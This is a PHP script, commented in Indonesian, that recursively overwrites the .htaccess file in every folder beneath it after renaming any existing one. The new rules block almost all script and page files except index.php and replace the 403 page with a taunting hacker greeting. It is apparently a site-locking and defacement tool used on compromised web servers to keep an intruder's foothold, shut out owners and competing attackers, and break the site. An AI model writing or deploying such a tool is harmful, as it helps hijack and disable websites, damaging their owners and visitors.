<?php

// Nama file log untuk mencatat kegagalan
$logFile = 'log.txt';

// Isi file .htaccess baru
$htaccessContent = <<<EOT
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.sh*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Sh*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.sH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.SH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.AS*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.As*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.aS*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.as*>
    Order Deny,Allow
    Deny from all
</Files>
<FilesMatch ".*\.(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|htm|html|alfa|htaccess)$"> 
Order Allow,Deny
Deny from all
</FilesMatch>
<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>
<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>
<FilesMatch "\.()$">
    Order Deny,Allow
    Allow from all
</FilesMatch>
<FilesMatch '^(index.php)$'>
Order allow,deny
Allow from all
</FilesMatch>

ErrorDocument 403 '<center><img src="https://i.imgur.com/mHc8kL1.gif"></img> <h3>IZIN NUMPANG LEWAT YA ABANG JAGOAN</font><br><h2>AMPUN BANG</h2>'
EOT;

// ============================================================
// Fungsi menulis log kegagalan
// ============================================================
function writeFailureLog($message) {
    global $logFile;
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($logFile, "[$timestamp] $message" . PHP_EOL, FILE_APPEND);
}

// ============================================================
// Fungsi membuat .htaccess secara rekursif
// ============================================================
function createHtaccessRecursive($dir, $content) {
    // Cek apakah folder bisa dibaca
    if (!is_readable($dir)) {
        echo "🚫 TIDAK DAPAT DIAKSES: $dir\n";
        writeFailureLog("Folder tidak dapat diakses (permission denied): $dir");
        return;
    }

    $items = @scandir($dir);
    if ($items === false) {
        echo "❌ GAGAL membaca isi folder: $dir\n";
        writeFailureLog("Gagal membaca isi folder: $dir");
        return;
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;

        if (is_dir($path)) {
            createHtaccessRecursive($path, $content);
        }
    }

    // Proses pembuatan file di folder saat ini
    $htaccessFile = $dir . DIRECTORY_SEPARATOR . ".htaccess";
    $backupFile   = $dir . DIRECTORY_SEPARATOR . ".htaccess_BAK";

    if (!is_writable($dir)) {
        echo "⚠️  GAGAL: Folder tidak bisa ditulis: $dir\n";
        writeFailureLog("Folder tidak bisa ditulis: $dir");
        return;
    }

    if (file_exists($htaccessFile)) {
        if (!file_exists($backupFile)) {
            if (!@rename($htaccessFile, $backupFile)) {
                $error = error_get_last();
                echo "❌ GAGAL backup '$dir/.htaccess' — {$error['message']}\n";
                writeFailureLog("Gagal backup di '$dir' — {$error['message']}");
                return;
            }
            echo "✅ Backup dibuat: $backupFile\n";
        } else {
            echo "ℹ️  Backup sudah ada di: $dir\n";
        }
    }

    echo "📝 Membuat .htaccess di: $dir\n";
    if (file_put_contents($htaccessFile, $content) === false) {
        $error = error_get_last();
        echo "❌ GAGAL menulis .htaccess di '$dir' — {$error['message']}\n";
        writeFailureLog("Gagal menulis .htaccess di '$dir' — {$error['message']}");
    } else {
        echo "✅ Berhasil membuat .htaccess di: $dir\n";
    }
}

// ============================================================
// Eksekusi skrip
// ============================================================
file_put_contents($logFile, "=== LOG KEGAGALAN PEMBUATAN .HTACCESS ===" . PHP_EOL);

echo "Skrip dijalankan dari folder: " . __DIR__ . "\n";
echo "Folder yang gagal diakses atau ditulis akan dicatat di file '$logFile'.\n\n";

$baseDir = __DIR__;
createHtaccessRecursive($baseDir, $htaccessContent);

echo "\n🎉 Proses selesai! Cek '$logFile' untuk detail kegagalan.\n";

?>